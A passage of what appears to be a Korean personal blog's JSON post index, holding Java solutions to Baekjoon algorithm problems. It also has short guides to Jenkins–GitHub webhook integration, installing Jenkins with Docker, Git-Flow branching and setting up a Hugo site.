중인데, 애석하게도 항상 정신없는 재현이는 돈을 실수로 잘못 부르는 사고를 치기 일쑤였다. 재현이는 잘못된 수를 부를 때마다 0을 외쳐서, 가장 최근에 재민이가 쓴 수를 지우게 시킨다. 재민이는 이렇게 모든 수를 받아 적은 후 그 수의 합을 알고 싶어 한다. 재민이를 도와주자!\n [입력]  첫 번째 줄에 정수 K가 주어진다. (1 ≤ K ≤ 100,000) 이후 K개의 줄에 정수가 1개씩 주어진다. 정수는 0에서 1,000,000 사이의 값을 가지며, 정수가 \u0026ldquo;0\u0026rdquo; 일 경우에는 가장 최근에 쓴 수를 지우고, 아닐 경우 해당 수를 쓴다. 정수가 \u0026ldquo;0\u0026quot;일 경우에 지울 수 있는 수가 있음을 보장할 수 있다.\n [출력]  재민이가 최종적으로 적어 낸 수의 합을 출력한다. 최종적으로 적어낸 수의 합은 2^31-1보다 작거나 같은 정수이다.\n [소스] import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int K=sc.nextInt(); Stack\u0026lt;Integer\u0026gt; st = new Stack\u0026lt;Integer\u0026gt;(); for(int i=0;i\u0026lt;K;i++){ int tmp=sc.nextInt(); if(tmp!=0) st.push(tmp); else st.pop(); } int ans=0; while(!st.isEmpty()) ans+=st.pop(); System.out.println(ans); } } 문제링크 https://www.acmicpc.net/problem/10773\n","date":"2021-08-13T21:28:50+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10733-%EC%A0%9C%EB%A1%9C/","title":"백준 10733 제로"},{"content":"[문제]  9개의 서로 다른 자연수가 주어질 때, 이들 중 최댓값을 찾고 그 최댓값이 몇 번째 수인지를 구하는 프로그램을 \u0026gt; 작성하시오. 예를 들어, 서로 다른 9개의 자연수 3, 29, 38, 12, 57, 74, 40, 85, 61 이 주어지면, 이들 중 최댓값은 85이고, 이 값은 8번째 수이다.\n [입력]  첫째 줄부터 아홉 번째 줄까지 한 줄에 하나의 자연수가 주어진다. 주어지는 자연수는 100 보다 작다.\n [출력]  첫째 줄에 최댓값을 출력하고, 둘째 줄에 최댓값이 몇 번째 수인지를 출력한다.\n [소스] import java.util.*; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int ans = 0; int cnt = 0; for(int i=0;i\u0026lt;9;i++){ int tmp=sc.nextInt(); if(ans\u0026lt;tmp) { ans = tmp; cnt = i; } } System.out.println(ans); System.out.println(cnt+1); } } 문제링크 https://www.acmicpc.net/problem/2562\n","date":"2021-08-11T20:43:49+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2562-%EC%B5%9C%EB%8C%93%EA%B0%92/","title":"백준 2562 최댓값"},{"content":"[문제]  자연수 A와 B가 있을 때, A%B는 A를 B로 나눈 나머지 이다. 예를 들어, 7, 14, 27, 38을 3으로 나눈 \u0026gt;머지는 1, 2, 0, 2이다. 10개를 입력받은 뒤, 이를 42로 나눈 나머지를 구한다. 그 다음 서로 다른 값이 몇 개 있는지 출력하는 \u0026gt;로그램을 작성하시오.\n [입력]  첫째 줄부터 열번째 줄 까지 숫자가 한 줄에 하나씩 주어진다. 이 숫자는 1,000보다 작거나 같고, 음이 아닌 정수이다.\n [출력]  첫째 줄에, 42로 나누었을 때, 서로 다른 나머지가 몇 개 있는지 출력한다.\n [소스] import java.util.*; public class Main { public static void main(String[] args){ int[] arr = new int[42]; int ans=0; Scanner sc = new Scanner(System.in); for(int i=0;i\u0026lt;10;i++) arr[(sc.nextInt()%42)]++; for(int i=0;i\u0026lt;42;i++) if(arr[i]\u0026gt;0) ans++; System.out.println(ans); } } 문제링크 https://www.acmicpc.net/problem/3052\n","date":"2021-08-11T20:43:43+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-3052-%EB%82%98%EB%A8%B8%EC%A7%80/","title":"백준 3052 나머지"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 M개를 고른 수열 같은 수를 여러 번 골라도 된다. 고른 수열은 비내림차순이어야 한다. 길이가 K인 수열 A가 A1 ≤ A2 ≤ \u0026hellip; ≤ AK-1 ≤ AK를 만족하면, 비내림차순이라고 한다.\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 \u0026gt; 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int N,M; static int[] ans; static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); N=Integer.parseInt(stk.nextToken()); M=Integer.parseInt(stk.nextToken()); ans=new int[M]; go(1,0); System.out.println(sb); } static void go(int st,int depth) { if(depth==M) { for(int tmp:ans) sb.append(tmp+\u0026#34; \u0026#34;); sb.append(\u0026#39;\\n\u0026#39;); return; } for(int i=st;i\u0026lt;=N;i++) { ans[depth]=i; go(i,depth+1); } } } 문제링크 https://www.acmicpc.net/problem/15652\n","date":"2021-08-09T12:27:10+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15651-n%EA%B3%BC-m-4/","title":"백준 15651 N과 M (4)"},{"content":"[문제]  카지노에서 제일 인기 있는 게임 블랙잭의 규칙은 상당히 쉽다. 카드의 합이 21을 넘지 않는 한도 내에서, 카드의 합을 최대한 크게 만드는 게임이다. 블랙잭은 카지노마다 다양한 규정이 있다. 한국 최고의 블랙잭 고수 김정인은 새로운 블랙잭 규칙을 만들어 상근, 창영이와 게임하려고 한다. 김정인 버전의 블랙잭에서 각 카드에는 양의 정수가 쓰여 있다. 그 다음, 딜러는 N장의 카드를 모두 숫자가 보이도록 바닥에 놓는다. 그런 후에 딜러는 숫자 M을 크게 외친다. 이제 플레이어는 제한된 시간 안에 N장의 카드 중에서 3장의 카드를 골라야 한다. 블랙잭 변형 게임이기 때문에, 플레이어가 고른 카드의 합은 M을 넘지 않으면서 M과 최대한 가깝게 만들어야 한다. N장의 카드에 써져 있는 숫자가 주어졌을 때, M을 넘지 않으면서 M에 최대한 가까운 카드 3장의 합을 구해 \u0026gt; 출력하시오.\n ##[입력]\n 첫째 줄에 카드의 개수 N(3 ≤ N ≤ 100)과 M(10 ≤ M ≤ 300,000)이 주어진다. 둘째 줄에는 카드에 쓰여 있는 수가 주어지며, 이 값은 100,000을 넘지 않는 양의 정수이다. 합이 M을 넘지 않는 카드 3장을 찾을 수 있는 경우만 입력으로 주어진다.\n [출력]  첫째 줄에 M을 넘지 않으면서 M에 최대한 가까운 카드 3장의 합을 출력한다.\n [소스] import java.util.Scanner; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int N=sc.nextInt(); int M=sc.nextInt(); int max=0; int[] arr=new int[N]; for(int i=0;i\u0026lt;N;i++) arr[i]=sc.nextInt(); for(int i=0;i\u0026lt;N-2;i++) for(int j=i+1;j\u0026lt;N-1;j++) for(int k=j+1;k\u0026lt;N;k++){ int tmp=0; tmp=arr[i]+arr[j]+arr[k]; if(max\u0026lt;tmp\u0026amp;\u0026amp;tmp\u0026lt;=M) max=tmp; } System.out.println(max); } } 문제링크 https://www.acmicpc.net/problem/2798\n","date":"2021-08-09T12:25:01+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2798-%EB%B8%94%EB%9E%99%EC%9E%AD/","title":"백준 2798 블랙잭"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 M개를 고른 수열 같은 수를 여러 번 골라도 된다..\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 7)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int N,M; static int[] ans; static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); N=Integer.parseInt(stk.nextToken()); M=Integer.parseInt(stk.nextToken()); ans=new int[M]; go(0); System.out.println(sb); } static void go(int depth) { if(depth==M) { for(int tmp:ans) sb.append((tmp+1)+\u0026#34; \u0026#34;); sb.append(\u0026#39;\\n\u0026#39;); return; } for(int i=0;i\u0026lt;N;i++) { ans[depth]=i; go(depth+1); } } } 문제링크 https://www.acmicpc.net/problem/15651\n","date":"2021-08-08T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15651-n%EA%B3%BC-m-3/","title":"백준 15651 N과 M (3)"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열 고른 수열은 오름차순이어야 한다.\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.util.Scanner; public class Main{ static int N,M; static int[] arr; static boolean[] visited; public static void main(String args[]){ Scanner sc = new Scanner(System.in); N=sc.nextInt(); M=sc.nextInt(); arr=new int[M]; visited=new boolean[N+1]; go(1,0); } static void go(int c, int depth){ if(M==depth){ for(int ans:arr){ System.out.print(ans+ \u0026#34; \u0026#34;); } System.out.println(); return; } for(int i=c;i\u0026lt;=N;i++){ if(!visited[i]){ visited[i]=true; arr[depth]=i; go(i+1,depth+1); visited[i]=false; } } } } 문제링크 https://www.acmicpc.net/problem/15650\n","date":"2021-08-06T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15650-n%EA%B3%BC-m-2/","title":"백준 15650 N과 M (2)"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.util.Scanner; public class boj15649 { static int N,M; static int[] arr,visited; public static void main(String[] args) { Scanner sc = new Scanner(System.in); N=sc.nextInt(); M=sc.nextInt(); arr=new int[M]; visited=new int[N]; go(0); } static void go(int depth) { if(M==depth) { for(int ans:arr) System.out.print(ans+1+ \u0026#34; \u0026#34;); System.out.println(); return; } for(int i=0;i\u0026lt;N;i++) { if(visited[i]!=1) { visited[i]=1; arr[depth]=i; go(depth+1); visited[i]=0; } } } } 문제링크 https://www.acmicpc.net/problem/15649\n","date":"2021-08-05T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15649-n%EA%B3%BC-m-1/","title":"백준 15649 N과 M (1)"},{"content":"[문제]  N개의 정수가 주어진다. 이때, 최솟값과 최댓값을 구하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 정수의 개수 N (1 ≤ N ≤ 1,000,000)이 주어진다. 둘째 줄에는 N개의 정수를 공백으로 구분해서 주어진다. 모든 정수는 -1,000,000보다 크거나 같고, 1,000,000보다 작거나 같은 정수이다.\n [출력]  첫째 줄에 주어진 정수 N개의 최솟값과 최댓값을 공백으로 구분해 출력한다.\n [소스] import java.util.Scanner; public class boj10818{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int mn=1000000; int mx=-1000000; int N=sc.nextInt(); for(int i=0;i\u0026lt;N;i++){ int tmp = sc.nextInt(); if(mn\u0026gt;tmp) mn=tmp; if(mx\u0026lt;tmp) mx=tmp; } System.out.println(mn+\u0026#34; \u0026#34;+mx); } } 문제링크 https://www.acmicpc.net/problem/10818\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10818-%EC%B5%9C%EC%86%8C-%EC%B5%9C%EB%8C%80/","title":"백준 10818 최소, 최대"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  입력은 여러 개의 테스트 케이스로 이루어져 있다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 A+B를 출력한다.\n [소스] import java.util.Scanner; public class boj10951 { public static void main(String args[]){ Scanner sc=new Scanner(System.in); while(sc.hasNextInt()) System.out.println((sc.nextInt()+sc.nextInt())); } } 문제링크 https://www.acmicpc.net/problem/10951\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10951-a-b-4/","title":"백준 10951 A+B - 4"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 테스트 케이스의 개수 T가 주어진다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 \u0026ldquo;Case #x: \u0026ldquo;를 출력한 다음, A+B를 출력한다. 테스트 케이스 번호는 1부터 시작한다.\n [소스] import java.util.Scanner; public class boj11021{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int T=sc.nextInt(); for(int i=1;i\u0026lt;=T;i++) System.out.println(\u0026#34;Case #\u0026#34;+i+\u0026#34;: \u0026#34;+(sc.nextInt()+sc.nextInt())); } } 문제링크 https://www.acmicpc.net/problem/11021\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11021-a-b-7/","title":"백준 11021 A+B - 7"},{"content":"[문제]  두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 테스트 케이스의 개수 T가 주어진다. 각 테스트 케이스는 한 줄로 이루어져 있으며, 각 줄에 A와 B가 주어진다. (0 \u0026lt; A, B \u0026lt; 10)\n [출력]  각 테스트 케이스마다 \u0026ldquo;Case #x: A + B = C\u0026rdquo; 형식으로 출력한다. x는 테스트 케이스 번호이고 1부터 시작하며, C는 A+B이다.\n [소스] import java.util.Scanner; public class boj11022{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int T=sc.nextInt(); for(int i=1;i\u0026lt;=T;i++){ int A = sc.nextInt(); int B = sc.nextInt(); System.out.println(\u0026#34;Case #\u0026#34;+i+\u0026#34;: \u0026#34;+A+\u0026#34; + \u0026#34;+B+\u0026#34; = \u0026#34;+(A+B)); } } 문제링크 https://www.acmicpc.net/problem/11022\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11022-a-b-8/","title":"백준 11022 A+B - 8"},{"content":"[문제]  흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. \u0026ldquo;Quadrant n\u0026quot;은 \u0026ldquo;제n사분면\u0026quot;이라는 뜻이다.\n  예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.\n  점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.\n [입력]  첫 줄에는 정수 x가 주어진다. (−1000 ≤ x ≤ 1000; x ≠ 0) 다음 줄에는 정수 y가 주어진다. (−1000 ≤ y ≤ 1000; y ≠ 0)\n [출력]  점 (x, y)의 사분면 번호(1, 2, 3, 4 중 하나)를 출력한다.\n [소스] import java.util.Scanner; public class boj14681{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int x = sc.nextInt(); int y = sc.nextInt(); if(x\u0026gt;0) System.out.println(y\u0026gt;0?1:4); else System.out.println(y\u0026gt;0?2:3); } } 문제링크 https://www.acmicpc.net/problem/14681\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-14681-%EC%82%AC%EB%B6%84%EB%A9%B4-%EA%B3%A0%EB%A5%B4%EA%B8%B0/","title":"백준 14681 사분면 고르기"},{"content":"[문제]  연도가 주어졌을 때, 윤년이면 1, 아니면 0을 출력하는 프로그램을 작성하시오. 윤년은 연도가 4의 배수이면서, 100의 배수가 아닐 때 또는 400의 배수일 때이다. 예를 들어, 2012년은 4의 배수이면서 100의 배수가 아니라서 윤년이다. 1900년은 100의 배수이고 400의 배수는 아니기 때문에 윤년이 아니다. 하지만, 2000년은 400의 배수이기 때문에 윤년이다.\n [입력]  첫째 줄에 연도가 주어진다. 연도는 1보다 크거나 같고, 4000보다 작거나 같은 자연수이다\n [출력]  첫째 줄에 윤년이면 1, 아니면 0을 출력한다.\n [소스] import java.util.Scanner; public class boj2753{ public static void Main(String[] args){ Scanner sc = new Scanner(System.in);\tint yy=sc.nextInt(); if(yy%4==0) if(yy%100!=0|yy%400==0) System.out.println(1); else System.out.println(0); else System.out.println(0); } } 문제링크 https://www.acmicpc.net/problem/2753\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2753-%EC%9C%A4%EB%85%84/","title":"백준 2753 윤년"},{"content":"[문제]  상근이는 매일 아침 알람을 듣고 일어난다. 알람을 듣고 바로 일어나면 다행이겠지만, 항상 조금만 더 자려는 마음 때문에 매일 학교를 지각하고 있다. 상근이는 모든 방법을 동원해보았지만, 조금만 더 자려는 마음은 그 어떤 것도 없앨 수가 없었다. 이런 상근이를 불쌍하게 보던, 창영이는 자신이 사용하는 방법을 추천해 주었다. 바로 \u0026ldquo;45분 일찍 알람 설정하기\u0026quot;이다. 이 방법은 단순하다. 원래 설정되어 있는 알람을 45분 앞서는 시간으로 바꾸는 것이다. 어차피 알람 소리를 들으면, 알람을 끄고 조금 더 잘 것이기 때문이다. 이 방법을 사용하면, 매일 아침 더 잤다는 기분을 느낄 수 있고, 학교도 지각하지 않게 된다. 현재 상근이가 설정한 알람 시각이 주어졌을 때, 창영이의 방법을 사용한다면, 이를 언제로 고쳐야 하는지 구하는 프로그램을 작성하시오.\n [입력]  첫째 줄에 두 정수 H와 M이 주어진다. (0 ≤ H ≤ 23, 0 ≤ M ≤ 59) 그리고 이것은 현재 상근이가 설정한 놓은 알람 시간 H시 M분을 의미한다. 입력 시간은 24시간 표현을 사용한다. 24시간 표현에서 하루의 시작은 0:0(자정)이고, 끝은 23:59(다음날 자정 1분 전)이다. 시간을 나타낼 때, 불필요한 0은 사용하지 않는다.\n [출력]  첫째 줄에 상근이가 창영이의 방법을 사용할 때, 설정해야 하는 알람 시간을 출력한다. (입력과 같은 형태로 출력하면 된다.)\n [소스] import java.util.Scanner; public class boj2884{ public static void main(String[] args){ Scanner sc = new Scanner(System.in); int H = sc.nextInt(); int M = sc.nextInt()-45; if(M\u0026lt;0){ H--; M+=60; } if(H\u0026lt;0)H=23; System.out.println(H+\u0026#34; \u0026#34;+M); } } 문제링크 https://www.acmicpc.net/problem/2884\n","date":"2021-08-02T21:28:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2884-%EC%95%8C%EB%9E%8C-%EC%8B%9C%EA%B3%84/","title":"백준 2884 알람 시계"},{"content":"[문제]  간선에 가중치와 방향성이 없는 임의의 루트 있는 트리가 주어졌을 때, 아래의 쿼리에 답해보도록 하자. 정점 U를 루트로 하는 서브트리에 속한 정점의 수를 출력한다. 만약 이 문제를 해결하는 데에 어려움이 있다면, 하단의 힌트에 첨부한 문서를 참고하자.\n [입력]  트리의 정점의 수 N과 루트의 번호 R, 쿼리의 수 Q가 주어진다. (2 ≤ N ≤ 105, 1 ≤ R ≤ N, 1 ≤ Q ≤ 105)이어 N-1줄에 걸쳐, U V의 형태로 트리에 속한 간선의 정보가 주어진다. (1 ≤ U, V ≤ N, U ≠ V)이는 U와 V를 양 끝점으로 하는 간선이 트리에 속함을 의미한다.이어 Q줄에 걸쳐, 문제에 설명한 U가 하나씩 주어진다. (1 ≤ U ≤ N)입력으로 주어지는 트리는 항상 올바른 트리임이 보장된다.\n [출력]  Q줄에 걸쳐 각 쿼리의 답을 정수 하나로 출력한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.ArrayList; import java.util.List; import java.util.StringTokenizer; public class boj15681 { static List\u0026lt;Integer\u0026gt;[] list, tree; static int parent[],size[]; public static void main(String[] args) throws IOException { BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); int N = Integer.parseInt(stk.nextToken()); // 정점의 수 \tint R = Integer.parseInt(stk.nextToken()); // 루트의 번호 \tint Q = Integer.parseInt(stk.nextToken()); // 쿼리의 수  list = new ArrayList[N+1]; tree = new ArrayList[N+1]; parent = new int[N+1]; size = new int [N+1]; for(int i=0;i\u0026lt;list.length;i++) { list[i]=new ArrayList\u0026lt;\u0026gt;(); tree[i]=new ArrayList\u0026lt;\u0026gt;(); } for(int i=0;i\u0026lt;N-1;i++) { stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); int U = Integer.parseInt(stk.nextToken()); int V = Integer.parseInt(stk.nextToken()); list[U].add(V); list[V].add(U); } makeTree(R,-1); // 트리생성 \tcountSubtreeNodes(R); for(int i=0;i\u0026lt;Q;i++) { int query = Integer.parseInt(br.readLine()); System.out.println(size[query]); } } public static void makeTree(int currentNode, int parentNode) { for(int node : list[currentNode]) { if(node!=parentNode) { tree[currentNode].add(node); parent[node] = currentNode; makeTree(node, currentNode); } } } public static void countSubtreeNodes(int currentNode) { size[currentNode]=1; for(int node : tree[currentNode]) { countSubtreeNodes(node); size[currentNode]+=size[node]; } } } 문제링크 https://www.acmicpc.net/problem/15681\n","date":"2021-08-02T20:45:37+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15681-%ED%8A%B8%EB%A6%AC%EC%99%80-%EC%BF%BC%EB%A6%AC/","title":"백준 15681 트리와 쿼리"},{"content":"프로젝트에 Jenkins를 적용하면서 정리함\n1. Personal access Token 발급  Github 접속 후 프로필 클릭 [setting] - [Developer settings] 선택   Jenkins \n  [Personal access tokens] - [Generate new token] 클릭  Jenkins \n  토큰 명 입력\n  토큰에서 사용할 기능 선택 후 [Generate token] 클릭\n   Jenkins \n※ 아래 토큰은 나중에 다시확인 못하니 메모해야함!\n Jenkins \n2. Jenkins에 토큰 등록  Jenkins 접속 후 [Jenkins 관리] - [시스템 설정] 선택   Jenkins \n Github Server 설정에서 [Add Github Server] - [Add] 클릭   Jenkins \n 아까 메모 해둔 Token을 [Secret]에 등록, [ID]에 토큰을 구분할 이름 작성 후 [Add]클릭   Jenkins \n3. 프로젝트 생성   [Freestyle Project] 선택  Jenkins \n  General에서 [Github Project]선택 후 Github 주소 입력 ※ .git 까지 입력해야함 !\n   Jenkins \n 소스 코드 관리에서 [Git] 선택 후 Git주소를 [Repository URL]에 입력  ※ .git 까지 입력해야함 !\n Credentials 등록 위해 [Add] 클릭   Jenkins \n Kind에 [Username with Password] 선택 Username에 Github ID 작성 Password에 Github Password 작성 후 Add클릭   Jenkins \n 빌드 유발에서 [Github hook trggier for GITScm polling] 선택 후 프로젝트를 저장   Jenkins \n4. Github Webhook 설정   Webhooks를 설정 할 Project에서 [Setting]-[Webhooks]-[Add Webhook] 선택  Jenkins \n  Payload URL에 [Jenkins주소+/github-webhook/] 입력\n  Content type에 [application/json] 선택\n  Webhook 걸 이벤트 선택 후 [Add Webhook] 선택\n  아래 사진은 이미 등록이 되어있어서 update로 표시됨\n   Jenkins \n","date":"2021-04-24T22:06:22+09:00","permalink":"https://appealso.github.io/p/jenkins-github-%EC%97%B0%EB%8F%99-%EB%B0%A9%EB%B2%95/","title":"Jenkins + Github 연동 방법"},{"content":"Jenkins와 Github을 연동하면서 정리함\n1. 젠킨스 이미지 다운로드 % docker pull jenkins/jenkins:lts2. 젠킨스 실행 % docker run -p 8080:8080 -p 50000:50000 -v /#(your_home):/var/jenkins_home --name jenkins jenkins/jenkins:lts# -p\t호스트와 컨테이너의 포트를 연결 (포워딩)# -v\t호스트와 컨테이너의 디렉토리를 연결 (마운트)# --name container 이름 지정3. 젠킨스 설치 (1) 비밀번호 입력  Docker \n(2) Install suggested plugins선택  Docker \n(3) 설치 진행  Docker \n(4) 계정 설정  Docker \n(5) 설치 완료  Docker \n","date":"2021-04-24T21:10:40+09:00","permalink":"https://appealso.github.io/p/docker%ED%86%B5%ED%95%9C-%EC%A0%A0%ED%82%A8%EC%8A%A4jenkins-%EC%84%A4%EC%B9%98/","title":"Docker통한 젠킨스(Jenkins) 설치 "},{"content":"프로젝트 형상 관리에 Git-Flow를 적용하기 위해 정리 함\nBranch 종류  Git-Flow \nGit-Flow는 5가지 브랜치를 사용 1. master  유지 브랜치 실제 프로그램이 배포되는 브랜치 (Production (운영 Branch))  2. develop  유지 브랜치 개발 브랜치 (Develop(개발 Branch)) 개발 완료 후 release 브랜치에 merge  3. release  유지 브랜치 QA 테스트 브랜치 (Staging (품질 테스트 Branch)) 테스트 완료 후 master 브랜치에 merge  4. feature  보조 브랜치 기능 개발 브랜치 (실제 개발) 일정에 맞춰 develop에 merge 및 해당 브랜치 삭제  5. hotfix  보조 브랜치 긴급 오류 해결을 위한 브랜치 (운영 버그 수정) 오류 수정 후 master에 merge 및 해당 브랜치 삭제  Git flow 설치하기 $ brew install git-flow-avh 초기화 $ git flow init 메인 브랜치  Git-Flow \n1. materst branch  origin/master에 두고 관리 master 브랜치에 merge는 새로운 버전을 의미  2. develop branch # -d를 붙이면 develop이라는 브랜치 생성 됨 $ git flow init -d  origin/develop에 두고 관리 개발자들이 개발한 소스를 반영하는 브랜치 develop 브랜치는 master에서 파생됨 release (QA 브랜치)를 사용하지 않을 경우 master에 merge하고 배포 버전으로 태그를 담  보조 브랜치  Git-Flow \n1. feature 브랜치  develop에서 파생된 브랜치 개발 완료 후 develop 브랜치에 merge  # 새 기능 개발 시작 $ git flow feature start 브랜치명 # 새 기능 개발 완료 $ git flow feature finish 브랜치명 # 새 기능 게시 $ git flow feature publish 브랜치명 # 게시된 기능 가져오기 $ git flow feature pull origin 브랜치명  Git-Flow \n2. release 브랜치  develop에서 파생된 브랜치 master에 merge하기 전 테스트 진행 release 브랜치에서는 기능 개발은 X 버그 수정 및 출시 준비 작업만 수행 완료되면 master와 develop에 merge 수행  # 릴리즈 시작 $ git flow release start 버전 # 릴리즈 완료 $ git flow release finish 버전 # 태그 푸시 $ git push --tags  Git-Flow \n3. hotfix 브랜치  master에서 파생된 브랜치 master에 배포한 제품에 버그를 즉각 대응할 때 생성 버그 수정 후 master와 develop에 merge 수행  # 핫 픽스 시작 $ git flow hotfix start 버전 [BASENAME] # 핫 픽스 완료 $ git flow hotfix finish 버전 참고 https://dahye-jeong.gitbook.io/git/git/2019-01-27-git-flow?\nhttps://88240.tistory.com/489\nhttps://danielkummer.github.io/git-flow-cheatsheet/index.ko_KR.html#comment-4550019179?\nhttps://nvie.com/posts/a-successful-git-branching-model/\n","date":"2021-04-24T18:51:40+09:00","permalink":"https://appealso.github.io/p/git-flow-%EC%A0%95%EB%A6%AC/","title":"Git-Flow 정리"},{"content":"GithubIO와 hugo theme을 적용하면서 정리함\n1. hugo 설치 % brew isntall hugo % hugo version // 휴고 버전 확인 2. Directory 구성 ├── archetypes ├── config.toml //hugo theme 설정파일 ├── content // post 저장 위치 ├── data ├── layouts ├── static //image 저장 위치 인듯...? └── themes // 테마 저장 폴더 3. hugo로 웹 사이트 생성 \u0026amp; 테마 다운로드 % hugo new site \u0026lt;hugo디렉토리명\u0026gt; % cd theme \u0026lt;hugo디렉토리명\u0026gt;/themes % git submodule add \u0026lt;테마git 주소\u0026gt; \u0026lt;테마명\u0026gt; 테마다운로드주소 : https://themes.gohugo.io\n4. hugo 테마 적용 hugo 테마는 github repository가 2개 필요함. hugo 설정파일 repository와 실제 사이트 repository 두개를 생성해야함.\n% cd \u0026lt;hugo디렉토리명\u0026gt; \u0026lt;hugo디렉토리명\u0026gt; % git init \u0026lt;hugo디렉토리명\u0026gt; % git remote add origin \u0026lt;hugo repository 주소\u0026gt; \u0026lt;hugo디렉토리명\u0026gt; % git submodule add -b master \u0026lt;github.io repository 주소\u0026gt; public //실제 사이트는 public 폴더에서 볼 수 있음. \u0026lt;hugo디렉토리명\u0026gt; % hugo -t \u0026lt;테마명\u0026gt; 5. config.toml 설정 % vi config.toml theme = \u0026quot;테마명\u0026quot; 